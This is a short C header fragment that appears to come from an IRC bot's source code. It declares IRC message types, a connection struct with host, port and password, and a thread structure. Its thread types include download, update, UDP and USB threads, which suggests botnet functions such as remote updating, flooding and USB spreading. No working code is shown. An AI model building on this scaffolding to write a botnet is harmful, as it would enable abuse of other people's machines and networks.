typedef enum
{
	MSG_PASS,
	MSG_NICK,	
	MSG_USER,
	MSG_PONG,
	MSG_JOIN,
	MSG_PART,
	MSG_PRIVMSG,
	MSG_QUIT
} ircmessage;

typedef enum
{
	NONE,
	DOWNLOAD_THREAD,
	UPDATE_THREAD,
	UDP_THREAD,
    USB_THREAD
} thread_type;

typedef struct 
{
	HANDLE		tHandle;
	thread_type type;
	SOCKET		tsock;
} thread_s;

typedef struct 
{
	char *host;
	unsigned short port;
	char *password;
} ircconnect_s;

typedef struct NTHREAD {
	void *conn;
	char target[128];
	int  threadnum;
	char *data1;
	char *data2;
	char *data3;
	BOOL bdata1;
	BOOL bdata2;
	BOOL bdata3;
	int idata1;
	int idata2;
	SOCKET sock;
	SOCKET csock;
	BOOL verbose;
	BOOL silent;
	BOOL gotinfo;
} NTHREAD;



//You didn't even search for the NTHREAD shit.. no but i did something wrong i added this
